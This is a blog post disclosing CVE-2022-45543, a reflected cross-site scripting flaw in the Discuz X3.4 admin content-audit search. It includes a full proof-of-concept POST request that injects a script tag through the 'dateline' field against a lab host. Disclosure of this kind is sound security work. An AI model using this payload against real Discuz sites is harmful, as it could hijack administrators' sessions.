=== Content from srpopty.github.io_98d3ae48_20250115_090020.html ===


[Shadow Gallery](/)

Live in the shadow

* [首页](/)
* [知识库](/knowledge/)
* [随想](/life/)
* [ctf](/ctf/)
* [漏洞](/vulnerabilities/)
* [标签](/tags/)
* [分类](/categories/)
* [归档](/archives/)
* [站点地图](/sitemap.xml)
* 搜索

0%

# Discuz X3.4 Backend Reflected XSS (CVE-2022-45543)

发表于
2023-02-15

分类于
[Vulnerability](/categories/Vulnerability/)

Discuz-X3.4-SC\_UTF8\_20221111 with Backend Reflected Cross-Site Scripting in admin.php auditing content.

# Description

Admin backend audit search of content audit component with reflected-XSS in POST value `dateline`, `title`, `tpp` and `username`, which bypassed discuz security check and even could hijack callback url link, and it can also inject javascript to setTimeout at the end of html response.

# Affected Version

DiscuzX <= 3.4, SC\_UTF8\_20221111

![](/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/da3b14b2_12015184.png)

# POC

| ``` 12345678910111213141516 ``` | ``` POST /cms/discuz/upload/admin.php?action=moderate&operation=threads HTTP/1.1Host: 192.168.0.4Content-Length: 166Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://192.168.0.4Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.0.4/cms/discuz/upload/admin.php?action=moderate&operation=threadsAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: 5Kkn_2132_saltkey=y03s5T45; 5Kkn_2132_lastvisit=1668496347; 5Kkn_2132_ulastactivity=07108qps3b3FkXEEZNxrT%2BtyQpXYN9%2FSOodQCNbMLoO%2BO6DOk8pF; 5Kkn_2132_auth=7791L55DZFdkAgcM5rDcnjIiVH0t%2BptlGCIqLkAhUIRMsUDTnq%2BGi7atBCt%2BPdyl2mCVv0hA3jA%2BxaOfDB1h; 5Kkn_2132_lastcheckfeed=1%7C1668501456; 5Kkn_2132_nofavfid=1; 5Kkn_2132_sid=yhpz44; 5Kkn_2132_lip=172.17.0.1%2C1668502019; 5Kkn_2132_lastact=1668502045%09admin.php%09Connection: closeformhash=288a0c1d&scrolltop=&anchor=&username=aa&title=aa&tpp=20&filter=normal&modfid=all&dateline=604"></a><script>alert(1)</script><!--&modsubmit=%E6%8F%90%E4%BA%A4 ``` |
| --- | --- |

![](/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/a98c544f_12015184.png)

![](/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/c20f32f9_12015184.png)

![](/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/d35d3b7c_12015184.png)

![](/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/0d4be145_12015184.png)

![](/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/b518294b_12015184.png)

# Reference

* [Gitee Issue](https://gitee.com/Discuz/DiscuzX/issues/I61CR2) (Login Required)
* [CVE](https://www.cve.org/CVERecord?id=CVE-2022-45543)

> Reported by Srpopty, vulnerability discovered by using Corax.

[# Web](/tags/Web/)
[# CVE](/tags/CVE/)
[# XSS](/tags/XSS/)

[Web Server Environment Configuration CheatSheet](/2023/02/15/Web-Server-Environment-Configuration-CheatSheet/ "Web Server Environment Configuration CheatSheet")
[EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45539)](/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-%28CVE-2022-45539%29/ "EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45539)")

* 文章目录
* 站点概览

1. [1. Description](#Description)
2. [2. Affected Version](#Affected-Version)
3. [3. POC](#POC)
4. [4. Reference](#Reference)

Srpopty

[47
日志](/archives/)

[9
分类](/categories/)

[18
标签](/tags/)

[GitHub](https://github.com/Srpopty "GitHub → https://github.com/Srpopty")

E-Mail

© 2016 –
2024

Srpopty


